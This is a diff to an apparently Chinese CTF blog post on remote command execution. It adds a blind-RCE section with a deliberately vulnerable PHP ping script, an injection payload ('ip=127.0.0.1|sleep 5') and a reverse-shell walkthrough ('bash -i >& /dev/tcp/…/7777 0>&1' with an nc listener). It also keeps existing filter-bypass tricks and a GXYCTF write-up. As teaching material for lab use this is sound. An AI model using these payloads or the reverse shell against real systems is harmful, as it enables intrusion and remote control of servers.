@@ -23,13 +23,17 @@
 <meta property="og:site_name" content="fru1ts的故酒">
 <meta property="og:description" content="RCE基础RCE(remote command&#x2F;code execute)漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上在CTF中，命令执行一般发生在远程，故被称为远程命令执行 通常情况下，在开发者使用一些执行命">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fru1ts.github.io/2023/01/05/RCE/2.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/01/05/RCE/3.png">
+<meta property="og:image" content="https://fru1ts.github.io/2023/01/05/RCE/4.png">
+<meta property="og:image" content="https://fru1ts.github.io/2023/01/05/RCE/5.png">
 <meta property="og:image" content="https://fru1ts.github.io/2023/01/05/RCE/1.png">
 <meta property="article:published_time" content="2023-01-05T03:34:48.000Z">
-<meta property="article:modified_time" content="2023-01-07T08:42:28.488Z">
+<meta property="article:modified_time" content="2023-01-24T07:01:38.724Z">
 <meta property="article:author" content="fru1ts">
 <meta property="article:tag" content="PHP代码审计,rce">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fru1ts.github.io/2023/01/05/RCE/1.png">
+<meta name="twitter:image" content="https://fru1ts.github.io/2023/01/05/RCE/2.jpg">
   
   
   
@@ -245,7 +249,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.1k 字
+          4.1k 字
         
       </span>
     
@@ -256,7 +260,7 @@
         
         
         
-          26 分钟
+          34 分钟
         
       </span>
     
@@ -307,7 +311,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年1月7日 下午
+                    本文最后更新于：2023年1月24日 下午
                   
                 
               </p>
@@ -337,6 +341,34 @@
 
 <h5 id="2-黑名单关键字"><a href="#2-黑名单关键字" class="headerlink" title="2.黑名单关键字"></a>2.黑名单关键字</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-number">1</span>)利用变量拼接<br>	linux下：a=c;b=at;c=he;d=llo;$a<span class="hljs-variable">$b</span> $&#123;c&#125;$&#123;d&#125;   <span class="hljs-comment">#cat hello</span><br>(<span class="hljs-number">2</span>)使用通配符<br>	“？”代表任意一个字符串，“*”则代表任意个字符串<br>	windows下：type fla*<br>	linux下:cat fl*<br>(<span class="hljs-number">3</span>)单引号或双引号绕过：linux下：ca<span class="hljs-string">&#x27;&#x27;</span>t flag 或 ca<span class="hljs-string">&quot;&quot;</span>t <span class="hljs-title function_ invoke__">flag</span><br>(<span class="hljs-number">4</span>)反斜杆绕过：linux下：ca\t f\<span class="hljs-title function_ invoke__">lag</span><br>(<span class="hljs-number">5</span>)借用已有字符串<br>	利用<span class="hljs-title function_ invoke__">substr</span>()函数截取<br>	linux下：<br>        <span class="hljs-comment">#lemon.php</span><br>        <span class="hljs-meta">&lt;?php</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>        <span class="hljs-meta">?&gt;</span><br>        substr $(awk NR==<span class="hljs-number">1</span> lemon.php) <span class="hljs-number">1</span> <span class="hljs-number">1</span>   <span class="hljs-comment">#&lt;</span><br>        substr $(awk NR==<span class="hljs-number">1</span> lemon.php) <span class="hljs-number">2</span> <span class="hljs-number">1</span>   <span class="hljs-comment">#?</span><br>(<span class="hljs-number">6</span>)编码绕过：base64编码，hex编码（linux）<br></code></pre></td></tr></table></figure>
 
+<h4 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h4><p>无回显RCE说明命令能够正常执行，但是命令执行结果不能回显</p>
+<p>可以利用sleep函数测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping&#x27;</span>.<span class="hljs-variable">$target</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>|sleep <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure>
+
+<p>接着需要利用反弹shell </p>
+<p>反弹shell需要自己有一台服务器,这里利用虚拟机和真实机做实验</p>
+<p>实验环境：</p>
+<p>虚拟机：kali-linux-2021.2	192.168.224.128</p>
+<p>真实机：windows10			192.168.1.22</p>
+<p>第一步：虚拟机开启监听端口<code>nc -lvp 7777</code>	</p>
+<p>第二步：真实机用git bash 运行<code>bash -i &gt;&amp; /dev/tcp/192.168.224.128/7777 0&gt;&amp;1</code>	</p>
+<p>解释这个语句</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i代表在本地打开一个bash<br><span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上/</span>dev<span class="hljs-regexp">/tcp/i</span>p/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出<br><span class="hljs-number">0</span> - stdin 代表标准输入,使用&lt;或&lt;&lt;<br><span class="hljs-number">1</span> - stdout 代表标准输出,使用&gt;或&gt;&gt;<br><span class="hljs-number">2</span> - stderr 代表标准错误输出,使用<span class="hljs-number">2</span>&gt;或<span class="hljs-number">2</span>&gt;&gt;<br>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。<br>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符<br></code></pre></td></tr></table></figure>
+
+<p>之后虚拟机连接到真实机进行rce	</p>
+<img src="/2023/01/05/RCE/2.jpg" srcset="/img/loading.gif" lazyload class="">
+
+<p>下面给出了整个过程的数据流向，首先是本地的输入输出流向</p>
+<img src="/2023/01/05/RCE/3.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>执行<code>bash -i &gt;&amp; /dev/tcp/ip/port</code>后</p>
+<img src="/2023/01/05/RCE/4.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>执行<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>或者<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;2</code>后:</p>
+<img src="/2023/01/05/RCE/5.png" srcset="/img/loading.gif" lazyload class="">
+
 <h3 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h3><img src="/2023/01/05/RCE/1.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>一个ping的接口，也就是结合ping进行rce</p>
@@ -354,6 +386,7 @@
 <p>再查看页面源码就可以得到flag<code>NSSCTF&#123;5775c26b-4632-4342-9e6b-347d2d00fa55&#125;</code></p>
 <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><em>参考资料</em></h3><p><em>《从0到1：CTFer成长之路 (Nu1L战队 编著) 》</em></p>
 <p><em><a target="_blank" rel="noopener" href="https://ctf-wiki.org/web/php/php/#_8">https://ctf-wiki.org/web/php/php/#_8</a></em></p>
+<p><em><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a></em></p>
 
                 
               </div>
